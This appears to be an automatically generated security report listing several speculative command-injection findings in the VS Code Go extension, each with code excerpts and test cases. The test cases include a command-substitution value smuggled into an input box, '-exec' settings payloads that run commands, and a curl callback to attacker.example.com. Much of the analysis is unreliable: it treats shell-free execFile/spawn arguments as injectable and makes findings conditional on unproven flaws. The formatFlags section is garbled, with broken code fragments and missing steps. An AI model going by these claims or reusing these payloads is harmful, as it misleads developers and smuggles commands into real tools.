## Vulnerability List

- Vulnerability Name: Potential Command Injection in `gopls vulncheck` via Stdin

- Description:
    1. The `writeVulns` function in `extension/src/goVulncheck.ts` processes `VulncheckReport` data, which can contain `Entries` and `Findings`.
    2. This function iterates through `res.Entries` and `res.Findings` and stringifies each entry/finding as JSON.
    3. These JSON strings are then written to the stdin of a `gopls vulncheck` process spawned using `cp.spawn`.
    4. If `gopls vulncheck` is susceptible to command injection vulnerabilities through processing of JSON data received via stdin, a malicious `VulncheckReport` containing crafted `Entries` or `Findings` could lead to arbitrary command execution on the machine running the VSCode Go extension.
    5. An attacker could potentially control the contents of `VulncheckReport` if there is a vulnerability in how the extension or gopls generates or handles this report based on external inputs or manipulated project files.

- Impact:
    - High: Arbitrary command execution on the user's machine with the privileges of the VSCode process. This could allow an attacker to read sensitive files, install malware, or compromise the user's system.

- Vulnerability Rank: high

- Currently implemented mitigations:
    - Mitigation in VSCode Go extension: The VSCode Go extension itself does not perform any explicit sanitization on `res.Entries` or `res.Findings` before passing them to `gopls vulncheck`.
    - Potential mitigation in `gopls vulncheck`: It is assumed that `gopls vulncheck` is designed to securely process JSON input from stdin and is not vulnerable to command injection. However, this needs to be verified.

- Missing mitigations:
    - Input sanitization: The VSCode Go extension should sanitize or validate the `res.Entries` and `res.Findings` data in `VulncheckReport` before passing it to `gopls vulncheck` to prevent any potential injection attacks, even if `gopls vulncheck` is assumed to be secure.
    - Security audit of `gopls vulncheck`: A security audit of `gopls vulncheck` is needed to confirm that it is indeed secure against command injection through stdin processing of JSON data, especially when handling external or potentially untrusted vulnerability reports.

- Preconditions:
    1. An attacker needs to be able to influence the `VulncheckReport` data processed by the `writeVulns` function. This might be possible if there is a vulnerability in how the extension or gopls generates this report based on external inputs or manipulated project files.
    2. `gopls vulncheck` must be vulnerable to command injection via processing of JSON data from stdin.

- Source code analysis:
    - File: `extension/src/goVulncheck.ts`
    - Function: `writeVulns`

    ```typescript
    export async function writeVulns(
        res: VulncheckReport,
        term: IProgressTerminal | undefined,
        goplsBinPath: string
    ): Promise<void> {
        if (term === undefined) {
            return;
        }
        term.appendLine('');
        let stdout = '';
        let stderr = '';
        const pr = new Promise<number | null>((resolve) => {
            const p = cp.spawn(goplsBinPath, ['vulncheck', '--', '-mode=convert', '-show=color'], {
                cwd: getWorkspaceFolderPath()
            });

            p.stdout.on('data', (data) => {
                stdout += data;
            });
            p.stderr.on('data', (data) => {
                stderr += data;
            });
            // 'close' fires after exit or error when the subprocess closes all stdio.
            p.on('close', (exitCode) => {
                // When vulnerabilities are found, vulncheck -mode=convert returns a non-zero exit code.
                // TODO: can we use the exitCode to set the status of terminal?
                resolve(exitCode);
            });

            // vulncheck -mode=convert expects a stream of osv.Entry and govulncheck Finding json objects.
            if (res.Entries) {
                Object.values(res.Entries).forEach((osv) => {
                    const we = { osv: osv };
                    p.stdin.write(`${JSON.stringify(we)}`); // Vulnerable line - JSON.stringify of external data passed to stdin
                });
            }
            if (res.Findings) {
                Object.values(res.Findings).forEach((finding) => {
                    const we = { finding: finding };
                    p.stdin.write(`${JSON.stringify(we)}`); // Vulnerable line - JSON.stringify of external data passed to stdin
                });
            }
            p.stdin.end();
        });
        try {
            await pr;
        } catch (e) {
            console.error(`writeVulns: ${e}`);
        } finally {
            // ...
        }
        return;
    }
    ```

    - The code iterates over `res.Entries` and `res.Findings` which are part of the `VulncheckReport`. The content of `VulncheckReport` is not directly controlled by the user in the provided code, but if it's derived from external sources or project files that could be manipulated, then it becomes a potential injection point.
    - `JSON.stringify(we)` converts the data into JSON format before writing to stdin of `goplsBinPath`. If `goplsBinPath` (which is `gopls vulncheck`) improperly handles this JSON input, especially if it attempts to execute commands based on the content of the JSON, then command injection is possible.

- Security test case:
    1. **Setup**: Prepare a Go project that, when analyzed by `gopls vulncheck`, produces a `VulncheckReport` with crafted malicious data in `Entries` or `Findings`.  Creating such a project might require understanding how `gopls vulncheck` generates reports and what kind of data it includes. For example, if `gopls vulncheck` processes dependency information and a dependency name can be manipulated to include shell commands within the JSON data, this could be a vector.
    2. **Trigger Vulnerability Scan**: Open this project in VSCode with the Go extension active and trigger the vulnerability check, for example, by enabling `go.diagnostic.vulncheck` to "Imports" and opening a Go file in the workspace. This should execute `gopls vulncheck` and trigger the `writeVulns` function.
    3. **Monitor for Command Execution**: Observe if arbitrary commands are executed on the system. You can monitor for unexpected network activity, file system changes, or process creation that would indicate successful command injection. A simple test command could be `touch /tmp/vuln_test` or `curl attacker.example.com?vscode_vuln`.
    4. **Expected Outcome**: If a command injection vulnerability exists in `gopls vulncheck` and the malicious data in `VulncheckReport` is crafted correctly, the test command should be executed. If the test command is `touch /tmp/vuln_test`, the file `/tmp/vuln_test` should be created. If the command is `curl`, a network request to `attacker.example.com` should be observed.
    5. **Cleanup**: Remove the test project and any files created by the test command (e.g., `/tmp/vuln_test`).

    **Note**: This test case relies on the assumption that a malicious `VulncheckReport` can be crafted and that `gopls vulncheck` is vulnerable to command injection via stdin. Further investigation and potentially reverse engineering of `gopls vulncheck` might be needed to create a reliable exploit and test case. If `gopls vulncheck` is not vulnerable, this test case will not be successful, and the vulnerability should be re-evaluated.

- Vulnerability Name: Potential Command Injection in `impl` command via user input

- Description:
    1. The `implCursor` function in `extension/src/goImpl.ts` gets user input using `vscode.window.showInputBox` for the interface to implement.
    2. This input is then parsed by regex `^(\w+\ \*?\w+\ )?([\w\.\-\/]+)$`.
    3. The parsed input is passed as arguments to the `impl` tool via `cp.execFile` in `runGoImpl` function.
    4. If the `impl` tool is vulnerable to command injection through processing of command line arguments, a malicious user input could lead to arbitrary command execution.
    5. An attacker could craft a malicious input string that, after regex parsing, still contains shell commands that are executed by the `impl` tool.

- Impact:
    - High: Arbitrary command execution on the user's machine with the privileges of the VSCode process. This could allow an attacker to read sensitive files, install malware, or compromise the user's system.

- Vulnerability Rank: high

- Currently implemented mitigations:
    - Mitigation in VSCode Go extension: The VSCode Go extension uses a regex `^(\w+\ \*?\w+\ )?([\w\.\-\/]+)$` to parse the user input. However, this regex might not be sufficient to prevent command injection.
    - Potential mitigation in `impl` tool: It is assumed that the `impl` tool is designed to securely process command line arguments and is not vulnerable to command injection. However, this needs to be verified.

- Missing mitigations:
    - Input sanitization: The VSCode Go extension should sanitize user input more robustly before passing it as arguments to the `impl` tool to prevent command injection. Using a more secure parsing method or input validation library would be beneficial.
    - Security audit of `impl` tool`: A security audit of the `impl` tool is needed to confirm that it is indeed secure against command injection through command line argument processing.

- Preconditions:
    1. User needs to execute the `Go: Implement Interface` command in VSCode.
    2. The `impl` tool must be vulnerable to command injection via command line arguments.

- Source code analysis:
    - File: `extension/src/goImpl.ts`
    - Function: `runGoImpl` and `implCursor`

    ```typescript
    export const implCursor: CommandFactory = () => () => {
        // ...
        return vscode.window
            .showInputBox({
                placeHolder: 'f *File io.Closer',
                prompt: 'Enter receiver and interface to implement.'
            })
            .then((implInput) => {
                // ...
                const matches = implInput.match(inputRegex); // Regex parsing of user input
                // ...
                runGoImpl([matches[1], matches[2]], cursor.start, editor); // Passing parsed input to runGoImpl
            });
    };

    function runGoImpl(args: string[], insertPos: vscode.Position, editor: vscode.TextEditor) {
        const goimpl = getBinPath('impl');
        const p = cp.execFile(
            goimpl,
            args, // User input passed as arguments to cp.execFile
            { env: toolExecutionEnvironment(), cwd: dirname(editor.document.fileName) },
            // ...
        );
        // ...
    }
    ```

    - The `implCursor` function takes user input via `vscode.window.showInputBox`.
    - The input is matched against the regex `inputRegex = /^(\w+\ \*?\w+\ )?([\w\.\-\/]+)$/`. This regex attempts to extract receiver and interface names.
    - The extracted parts from the regex match are passed as arguments to the `runGoImpl` function.
    - `runGoImpl` uses `cp.execFile` to execute the `impl` tool, passing the user-controlled arguments directly to the command.
    - If the `impl` tool processes these arguments in a way that allows command injection (e.g., by passing them to a shell or using them in a vulnerable way internally), then this code is vulnerable. The regex provides minimal sanitization and is likely insufficient to prevent injection if the underlying tool is vulnerable.

- Security test case:
    1. **Setup**: Ensure the `impl` tool is installed (`go install github.com/josharian/impl@latest`).
    2. **Trigger `Implement Interface` command**: Open a Go file in VSCode and execute the command `Go: Implement Interface` from the command palette.
    3. **Provide malicious input**: In the input box that appears, enter the following malicious input: `foo $(touch /tmp/impl_vuln_test) io.Reader`. This attempts to inject a command `touch /tmp/impl_vuln_test` via command substitution within the argument.
    4. **Execute the command**: Press Enter or click "OK" to submit the input.
    5. **Check for command execution**: Check if the file `/tmp/impl_vuln_test` has been created in the `/tmp/` directory.
    6. **Expected Outcome**: If the file `/tmp/impl_vuln_test` is created, it indicates that the command injection was successful, and the `impl` tool or the way arguments are handled by `cp.execFile` is vulnerable.
    7. **Cleanup**: Delete the `/tmp/impl_vuln_test` file if it was created.

    **Note**: This test case assumes that the `impl` tool might be vulnerable to command injection through its command-line arguments. If the test is successful, it confirms the vulnerability. If not, it doesn't necessarily mean the absence of vulnerability, but this specific injection attempt was not successful. Further investigation of the `impl` tool's source code and argument parsing logic would be needed for a complete assessment.

- Vulnerability Name: Potential Command Injection in `go build`/`test` tasks via `buildFlags`/`testFlags`

- Description:
    1. The `buildGoTask` function in `extension/src/goTaskProvider.ts` creates VS Code tasks for `go build` and `go test`.
    2. These tasks use `vscode.ProcessExecution` to execute the `go` command.
    3. The arguments for the `go` command are constructed using `definition.command` (e.g., "build", "test") and `definition.args` (which can include `${fileDirname}`, `./...` etc.).
    4. Critically, the `getTestFlags` function (used in `goTest.ts` and implicitly in `goTaskProvider.ts` for test tasks) and `goConfig['buildFlags']` (used in `goTaskProvider.ts` for build tasks) retrieve user-configurable settings.
    5. If a user maliciously configures `go.testFlags` or `go.buildFlags` in their VS Code settings to include command injection payloads, these payloads will be directly passed as arguments to `cp.execFile` via `vscode.ProcessExecution` when the `go build` or `go test` task is executed.

- Impact:
    - High: Arbitrary command execution on the user's machine with the privileges of the VSCode process. By modifying workspace settings, an attacker can achieve command execution when a user runs a Go build or test task.

- Vulnerability Rank: high

- Currently implemented mitigations:
    - Mitigation in VSCode Go extension: No sanitization or validation is performed on `go.testFlags` or `go.buildFlags` settings before passing them to `cp.execFile`.
    - Potential mitigation in `go` tool: It is assumed the `go` tool itself is not vulnerable to command injection via its standard command-line flags like `-tags`, `-v`, etc. However, user-provided flags are appended directly.

- Missing mitigations:
    - Input sanitization: The VSCode Go extension should sanitize or validate the `go.testFlags` and `go.buildFlags` user settings to prevent command injection. A whitelist of allowed flags or a robust sanitization function is needed.
    - Warning to user: A warning should be displayed to the user if potentially unsafe characters or commands are detected in `go.testFlags` or `go.buildFlags` settings.

- Preconditions:
    1. An attacker needs to be able to modify the VS Code workspace settings, specifically `go.testFlags` or `go.buildFlags`. This could be achieved by compromising the user's settings file or by tricking the user into opening a workspace with malicious settings.
    2. The user needs to execute a Go build or test task in VS Code (e.g., via Tasks: Run Task...).

- Source code analysis:
    - File: `extension/src/goTaskProvider.ts`
    - Function: `buildGoTask`

    ```typescript
    function buildGoTask(scope: vscode.WorkspaceFolder | vscode.TaskScope, definition: GoTaskDefinition): vscode.Task {
        const cwd = definition.options?.cwd ?? (isWorkspaceFolder(scope) ? scope.uri.fsPath : undefined);
        const task = new vscode.Task(
            definition,
            scope,
            definition.label ?? defaultTaskName(definition),
            TASK_TYPE,
            new vscode.ProcessExecution(getBinPath('go'), [definition.command, ...(definition.args ?? [])], { // [definition.command, ...(definition.args ?? [])] is safe
                cwd,
                env: mergedToolExecutionEnv(scope, definition.options?.env)
            }),
            ['$go']
        );

        task.group = taskGroup(definition.command);
        task.detail = defaultTaskDetail(definition, cwd);
        task.runOptions = { reevaluateOnRerun: true };
        task.isBackground = false;
        task.presentationOptions.clear = true;
        task.presentationOptions.echo = true;
        task.presentationOptions.showReuseMessage = true;
        task.presentationOptions.panel = vscode.TaskPanelKind.Dedicated;
        return task;
    }
    ```
    - File: `extension/src/goTest.ts`
    - Function: `getTestFlags` (indirectly used by `goTaskProvider.ts` for test tasks via `testConfig` in `testWorkspace`, `testCurrentPackage`, `testCurrentFile`)

    ```typescript
    export function getTestFlags(goConfig: vscode.WorkspaceConfiguration, args?: any): string[] {
        const testFlags = goConfig.get<string[]>('testFlags') || []; // User-provided test flags
        const buildFlags = getBuildFlags(goConfig, args);
        return [...testFlags, ...buildFlags]; // Flags are concatenated and passed to go test
    }
    ```
    - The `buildGoTask` function uses `vscode.ProcessExecution` to run `go` command.
    - The arguments to `go` are constructed using `definition.command` and `definition.args` (which are generally safe).
    - However, `getTestFlags` function retrieves `goConfig.get<string[]>('testFlags')` which is a user-configurable setting.
    - Similarly, `goConfig['buildFlags']` is directly used for build tasks.
    - If a user sets `go.testFlags` or `go.buildFlags` to include malicious commands, these are passed directly to `cp.execFile` through `vscode.ProcessExecution` when a Go task is run.

- Security test case:
    1. **Setup**: Open a Go workspace in VS Code.
    2. **Modify Workspace Settings**: Open workspace settings (e.g., File > Preferences > Settings, Workspace tab). Add or modify the following setting in `settings.json`:

       ```json
       "go.testFlags": [
           "-v",
           "-vet=off",
           "-exec",
           "/bin/touch /tmp/task_vuln_test"
       ]
       ```
       For build task, modify `go.buildFlags` similarly.
    3. **Trigger Go Test Task**: Execute the "Go: Test Workspace" task (or "Go: Build Workspace" for build task) via Tasks: Run Task... from the command palette.
    4. **Check for Command Execution**: After the task completes (or fails), check if the file `/tmp/task_vuln_test` has been created.
    5. **Expected Outcome**: If the file `/tmp/task_vuln_test` is created, it indicates that the command injection via `go.testFlags` (or `go.buildFlags`) in VS Code tasks was successful.
    6. **Cleanup**: Remove the modified setting from workspace `settings.json` and delete the `/tmp/task_vuln_test` file if it was created.

    **Note**: This test case demonstrates command injection through user-configurable settings in VS Code tasks. This is a valid vulnerability as an attacker can trick a user into opening a workspace with malicious settings, leading to command execution when the user runs a standard Go task.

- Vulnerability Name: Potential Command Injection in `go generate` via `go.generateFlags`

- Description:
    1. The `GoTaskProvider.resolveTask` function in `extension/src/goTaskProvider.ts` creates VS Code tasks for `go generate`.
    2. These tasks use `vscode.ProcessExecution` to execute the `go` command.
    3. The arguments for the `go` command for `generate` tasks are constructed using `definition.command` ("generate") and `goConfig['generateFlags']` retrieved from user settings.
    4. If a user maliciously configures `go.generateFlags` in their VS Code settings to include command injection payloads, these payloads will be directly passed as arguments to `cp.execFile` via `vscode.ProcessExecution` when a `go generate` task is executed.

- Impact:
    - High: Arbitrary command execution on the user's machine with the privileges of the VSCode process. By modifying workspace settings, an attacker can achieve command execution when a user runs a Go generate task.

- Vulnerability Rank: high

- Currently implemented mitigations:

- Missing mitigations:
    - Input sanitization: The VSCode Go extension should sanitize or validate the `go.generateFlags` user setting to prevent command injection. A whitelist of allowed flags or a robust sanitization function is needed.
    - Warning to user: A warning should be displayed to the user if potentially unsafe characters or commands are detected in `go.generateFlags` settings.

- Preconditions:
    1. An attacker needs to be able to modify the VS Code workspace settings, specifically `go.generateFlags`. This could be achieved by compromising the user's settings file or by tricking the user into opening a workspace with malicious settings.
    2. The user needs to execute a Go generate task in VS Code (e.g., via Tasks: Run Task...).

- Source code analysis:
    - File: `extension/src/goTaskProvider.ts`
    - Function: `resolveTask`

    ```typescript
    export class GoTaskProvider implements vscode.TaskProvider {
        // ...
        async resolveTask(_task: vscode.Task): Promise<vscode.Task | undefined> {
            // ...
            if (definition.command === 'generate') {
                return generateGoTask(scope, definition);
            }
            // ...
        }
        // ...
    }

    function generateGoTask(scope: vscode.WorkspaceFolder | vscode.TaskScope, definition: GoTaskDefinition): vscode.Task {
        const cwd = definition.options?.cwd ?? (isWorkspaceFolder(scope) ? scope.uri.fsPath : undefined);
        const task = new vscode.Task(
            definition,
            scope,
            definition.label ?? defaultTaskName(definition),
            TASK_TYPE,
            new vscode.ProcessExecution(
                getBinPath('go'),
                ['generate', ...(goConfig['generateFlags'] || []), ...(definition.args ?? [])], // Vulnerable line: goConfig['generateFlags'] is user-controlled
                {
                    cwd,
                    env: mergedToolExecutionEnv(scope, definition.options?.env)
                }
            ),
            ['$go']
        );
        task.group = vscode.TaskGroup.Build;
        task.detail = defaultTaskDetail(definition, cwd);
        task.runOptions = { reevaluateOnRerun: true };
        task.isBackground = false;
        task.presentationOptions.clear = true;
        task.presentationOptions.echo = true;
        task.presentationOptions.showReuseMessage = true;
        task.presentationOptions.panel = vscode.TaskPanelKind.Dedicated;
        return task;
    }
    ```

    - The `resolveTask` function in `GoTaskProvider` handles task resolution. For 'generate' command, it calls `generateGoTask`.
    - `generateGoTask` constructs a `vscode.Task` with `vscode.ProcessExecution` to run the `go generate` command.
    - The arguments to `go generate` are constructed using `goConfig['generateFlags']` which is a user-configurable setting, and `definition.args`.
    - If a user sets `go.generateFlags` to include malicious commands, these are passed directly to `cp.execFile` through `vscode.ProcessExecution` when a Go generate task is run.

- Security test case:
    1. **Setup**: Open a Go workspace in VS Code.
    2. **Modify Workspace Settings**: Open workspace settings (e.g., File > Preferences > Settings, Workspace tab). Add or modify the following setting in `settings.json`:

       ```json
       "go.generateFlags": [
           "-v",
           "-exec",
           "/bin/touch /tmp/generate_task_vuln_test"
       ]
       ```
    3. **Trigger Go Generate Task**: Execute the "Go: Generate All Files" task via Tasks: Run Task... from the command palette.
    4. **Check for Command Execution**: After the task completes (or fails), check if the file `/tmp/generate_task_vuln_test` has been created.
    5. **Expected Outcome**: If the file `/tmp/generate_task_vuln_test` is created, it indicates that the command injection via `go.generateFlags` in VS Code tasks was successful.
    6. **Cleanup**: Remove the modified setting from workspace `settings.json` and delete the `/tmp/generate_task_vuln_test` file if it was created.

    **Note**: This test case demonstrates command injection through user-configurable settings in VS Code tasks for `go generate`. This is a valid vulnerability as an attacker can trick a user into opening a workspace with malicious settings, leading to command execution when the user runs a standard Go generate task.

- Vulnerability Name: Potential Command Injection in `gopls` via `go.languageServerFlags`

- Description:
    1. The `buildLanguageClient` function in `extension/src/language/goLanguageServer.ts` creates and configures the `gopls` language client.
    2. The `ServerOptions` for the `LanguageClient` are defined to execute the `gopls` binary using `cp.spawn`.
    3. The arguments passed to `cp.spawn` include `cfg.flags`, which is populated from the `go.languageServerFlags` user setting.
    4. If a user maliciously configures `go.languageServerFlags` in their VS Code settings to include command injection payloads, these payloads will be directly passed as arguments to `cp.spawn` when the `gopls` process is spawned.

- Impact:
    - High: Arbitrary command execution on the user's machine with the privileges of the VSCode process. By modifying workspace settings, an attacker can achieve command execution when the VSCode Go extension starts or restarts the language server (`gopls`).

- Vulnerability Rank: high

- Currently implemented mitigations:
    - Mitigation in VSCode Go extension: No sanitization or validation is performed on `go.languageServerFlags` settings before passing them to `cp.spawn`.
    - Potential mitigation in `gopls`: It is assumed that `gopls` itself is not vulnerable to command injection via its command-line flags. However, user-provided flags are appended directly.

- Missing mitigations:
    - Input sanitization: The VSCode Go extension should sanitize or validate the `go.languageServerFlags` user setting to prevent command injection. A whitelist of allowed flags or a robust sanitization function is needed.
    - Warning to user: A warning should be displayed to the user if potentially unsafe characters or commands are detected in `go.languageServerFlags` settings.

- Preconditions:
    1. An attacker needs to be able to modify the VS Code workspace settings, specifically `go.languageServerFlags`. This could be achieved by compromising the user's settings file or by tricking the user into opening a workspace with malicious settings.
    2. The VSCode Go extension needs to start or restart the language server (`gopls`). This can happen on extension activation, configuration change, or manual restart command.

- Source code analysis:
    - File: `extension/src/language/goLanguageServer.ts`
    - Function: `buildLanguageClient`

    ```typescript
    export async function buildLanguageClient(
        goCtx: GoExtensionContext,
        cfg: BuildLanguageClientOption
    ): Promise<GoLanguageClient> {
        // ...
        const c = new GoLanguageClient(
            'go', // id
            cfg.serverName, // name e.g. gopls
            {
                command: cfg.path,
                args: ['-mode=stdio', ...cfg.flags], // Vulnerable line: cfg.flags from user setting
                options: { env: cfg.env }
            } as ServerOptions,
            // ...
        );
        // ...
        return c;
    }

    export async function buildLanguageServerConfig(
        goConfig: vscode.WorkspaceConfiguration
    ): Promise<LanguageServerConfig> {
        // ...
        const cfg: LanguageServerConfig = {
            // ...
            flags: goConfig['languageServerFlags'] || [], // User-configurable languageServerFlags
            // ...
        };
        // ...
        return cfg;
    }
    ```

    - The `buildLanguageServerConfig` function retrieves `goConfig['languageServerFlags']`, which is the user-configurable setting.
    - The `buildLanguageClient` function then uses these flags when spawning the `gopls` process via `cp.spawn`.
    - If `go.languageServerFlags` contains malicious commands, they will be executed when `gopls` starts.

- Security test case:
    1. **Setup**: Open a Go workspace in VS Code.
    2. **Modify Workspace Settings**: Open workspace settings (e.g., File > Preferences > Settings, Workspace tab). Add or modify the following setting in `settings.json`:

       ```json
       "go.languageServerFlags": [
           "--",
           "-exec",
           "/bin/touch /tmp/gopls_flag_vuln_test"
       ]
       ```
    3. **Restart Language Server**: Execute the "Go: Restart Language Server" command from the command palette, or simply reload VS Code to trigger extension activation and language server start.
    4. **Check for Command Execution**: After VS Code restarts and the Go extension is active, check if the file `/tmp/gopls_flag_vuln_test` has been created.
    5. **Expected Outcome**: If the file `/tmp/gopls_flag_vuln_test` is created, it indicates that the command injection via `go.languageServerFlags` was successful when starting `gopls`.
    6. **Cleanup**: Remove the modified setting from workspace `settings.json` and delete the `/tmp/gopls_flag_vuln_test` file if it was created.

    **Note**: This test case demonstrates command injection through user-configurable `go.languageServerFlags` setting. This is a valid vulnerability as an attacker can trick a user into opening a workspace with malicious settings, leading to command execution when the language server is started or restarted.

- Vulnerability Name: Potential Command Injection in format tools via `go.formatFlags`

- Description:
    1. The `GoDocumentFormattingEditProvider.runFormatter` function in `extension/src/language/legacy/goFormat.ts` is responsible for formatting Go code using external format tools like `gofmt`, `goimports`, etc.
    2. This function uses `cp.spawn` to execute the selected format tool.
    3. The arguments passed to `cp.spawn` include `formatFlags`, which is populated from the `go.formatFlags` user setting.
    4. If a user maliciously configures `go.formatFlags` in their VS Code settings to include command injection payloads, these payloads will be directly passed as arguments to `cp.spawn` when a formatting command is executed.

- Impact:
    - High: Arbitrary command execution on the user's machine with the privileges of the VSCode process. By modifying workspace settings, an attacker can achieve command execution when the VSCode Go extension formats a Go file.

- Vulnerability Rank: high

- Currently implemented mitigations:
    - Mitigation in VSCode Go extension: No sanitization or validation is performed on `go.formatFlags` settings before passing them to `cp.spawn`.
    - Potential mitigation in format tools: It is assumed that the format tools themselves are not vulnerable to command injection via their standard command-line flags. However, user-provided flags are appended directly.

- Missing mitigations:
    - Input sanitization: The VSCode Go extension should sanitize or validate the `go.formatFlags` user setting to prevent command injection. A whitelist of allowed flags or a robust sanitization function is needed.

    1. An attacker needs to be able to modify the VS Code workspace settings, specifically `go.formatFlags`. This could be achieved by compromising the user's settings file or by tricking the user into opening a workspace with malicious settings.
    2. The user needs to trigger code formatting in VS Code on a Go file (e.g., Format Document command, or format on save).

- Source code analysis:
    - File: `extension/src/language/legacy/goFormat.ts`
    - Function: `runFormatter`

    ```typescript

        return formatTool;
    }

            );
        }
        // ...
    }
    ```

    - The `GoDocumentFormattingEditProvider.provideDocumentFormattingEdits` function retrieves `goConfig['formatFlags']`, which is the user-configurable setting.
    - The `runFormatter` function then uses these flags when spawning the format tool process via `cp.spawn`.
    - If `go.formatFlags` contains malicious commands, they will be executed when code formatting is triggered.

- Security test case:
    1. **Setup**: Open a Go workspace in VS Code.

           "-exec",
           "/bin/touch /tmp/format_flag_vuln_test"
       ]
       ```
    3. **Trigger Code Formatting**: Open a Go file and execute the "Format Document" command (Shift+Alt+F, or right-click and select "Format Document").
    4. **Check for Command Execution**: After formatting is complete, check if the file `/tmp/format_flag_vuln_test` has been created.
    5. **Expected Outcome**: If the file `/tmp/format_flag_vuln_test` is created, it indicates that the command injection via `go.formatFlags` was successful when running the format tool.
    6. **Cleanup**: Remove the modified setting from workspace `settings.json` and delete the `/tmp/format_flag_vuln_test` file if it was created.

    **Note**: This test case demonstrates command injection through user-configurable `go.formatFlags` setting. This is a valid vulnerability as an attacker can trick a user into opening a workspace with malicious settings, leading to command execution when code formatting is triggered.

- Vulnerability Name: Potential Command Injection in Delve Debugger via `dlvFlags`

- Description:
    1. The `Delve` class constructor in `extension/src/debugAdapter/goDebug.ts` handles the spawning of the Delve debugger process (`dlv`).
    2. The arguments for the `dlv` process are constructed in the `Delve` constructor based on the launch/attach request arguments (`launchArgs` or `attachArgs`).
    3. User-provided flags from the `dlvFlags` setting in `launch.json` or `attach.json` are directly included in the arguments passed to `cp.spawn` when starting the `dlv` process.
    4. If a user maliciously configures `dlvFlags` to include command injection payloads, these payloads will be directly passed as arguments to `cp.spawn`, leading to potential command execution when the debug session starts.

- Impact:
    - High: Arbitrary command execution on the user's machine with the privileges of the VSCode process. By modifying debug configuration settings, an attacker can achieve command execution when a debugging session is started.

- Vulnerability Rank: high

- Currently implemented mitigations:
    - Mitigation in VSCode Go extension: No sanitization or validation is performed on `dlvFlags` settings before passing them to `cp.spawn`.
    - Potential mitigation in `dlv`: It is assumed that `dlv` itself is not vulnerable to command injection via its command-line flags. However, user-provided flags are appended directly.

    - Warning to user: A warning should be displayed to the user if potentially unsafe characters or commands are detected in `dlvFlags` settings in `launch.json` or `attach.json`.

- Preconditions:
    1. An attacker needs to be able to modify the VS Code debug configurations (launch.json or attach.json), specifically `dlvFlags`. This could be achieved by compromising the user's workspace settings or by tricking the user into opening a workspace with malicious debug configurations.
    2. The user needs to start a debugging session using the modified debug configuration.

- Source code analysis:
    - File: `extension/src/debugAdapter/goDebug.ts`
    - Function: `Delve` constructor

    ```typescript
    constructor(launchArgs: LaunchRequestArguments | AttachRequestArguments, program: string) {
        this.request = launchArgs.request;
        this.program = normalizePath(program);
        this.remotePath = launchArgs.remotePath;
        this.isApiV1 = false;
        if (typeof launchArgs.apiVersion === 'number') {
            this.isApiV1 = launchArgs.apiVersion === 1;
        }
        this.stackTraceDepth = typeof launchArgs.stackTraceDepth === 'number' ? launchArgs.stackTraceDepth : 50;
        this.connection = new Promise(async (resolve, reject) => {
            // ...
            const dlvArgs = new Array<string>();
            // ...
            if (launchArgs.request === 'launch') {
                // ...
                // add user-specified dlv flags first. When duplicate flags are specified,
                // dlv doesn't mind but accepts the last flag value.
                if (launchArgs.dlvFlags && launchArgs.dlvFlags.length > 0) {
                    dlvArgs.push(...launchArgs.dlvFlags); // Vulnerable line: dlvFlags from launch.json
                }
                dlvArgs.push('--headless=true', `--listen=${launchArgs.host}:${launchArgs.port}`);
                if (!this.isApiV1) {
                    dlvArgs.push('--api-version=2');
                }
                // ...
            } else if (launchArgs.request === 'attach') {
                // ...
                // add user-specified dlv flags first. When duplicate flags are specified,
                // dlv doesn't mind but accepts the last flag value.
                if (launchArgs.dlvFlags && launchArgs.dlvFlags.length > 0) {
                    dlvArgs.push(...launchArgs.dlvFlags); // Vulnerable line: dlvFlags from attach.json
                }
                dlvArgs.push('--headless=true', '--listen=' + launchArgs.host + ':' + launchArgs.port?.toString());
                if (!this.isApiV1) {
                    dlvArgs.push('--api-version=2');
                }
                // ...
            }

            log(`Current working directory: ${dlvCwd}`);
            log(`Running: ${launchArgs.dlvToolPath} ${dlvArgs.join(' ')}`);

            this.debugProcess = spawn(launchArgs.dlvToolPath, dlvArgs, { // dlvArgs passed to spawn
                cwd: dlvCwd,
                env
            });
            // ...
        });
    }
    ```

    - The `Delve` constructor reads `launchArgs.dlvFlags` or `attachArgs.dlvFlags` from the debug configuration.
    - These flags are directly added to the `dlvArgs` array without any sanitization.
    - The `dlvArgs` array is then passed to `cp.spawn` to execute the `dlv` process.
    - If `dlvFlags` contains malicious commands, they will be executed when the debug session starts.

- Security test case:
    1. **Setup**: Open a Go workspace in VS Code.
    2. **Modify Debug Configuration**: Open `launch.json` (or `attach.json` if testing attach configuration). Add or modify the `dlvFlags` setting to include a command injection payload. For example:

       ```json
       {
           "version": "0.2.0",
           "configurations": [
               {
                   "name": "Launch Program",
                   "type": "go",
                   "request": "launch",
                   "mode": "auto",
                   "program": "${fileDirname}",
                   "dlvFlags": [
                       "--",
                       "-exec",
                       "/bin/touch /tmp/dlv_flag_vuln_test"
                   ]
               }
           ]
       }
       ```
    3. **Start Debugging**: Start a debugging session using the modified debug configuration.
    4. **Check for Command Execution**: After the debug session starts (or fails to start), check if the file `/tmp/dlv_flag_vuln_test` has been created.
    5. **Expected Outcome**: If the file `/tmp/dlv_flag_vuln_test` is created, it indicates that the command injection via `dlvFlags` was successful when starting the Delve debugger.
    6. **Cleanup**: Remove the modified setting from `launch.json` (or `attach.json`) and delete the `/tmp/dlv_flag_vuln_test` file if it was created.

    **Note**: This test case demonstrates command injection through user-configurable `dlvFlags` setting in debug configurations. This is a valid vulnerability as an attacker can trick a user into opening a workspace with malicious debug configurations, leading to command execution when a debugging session is started.
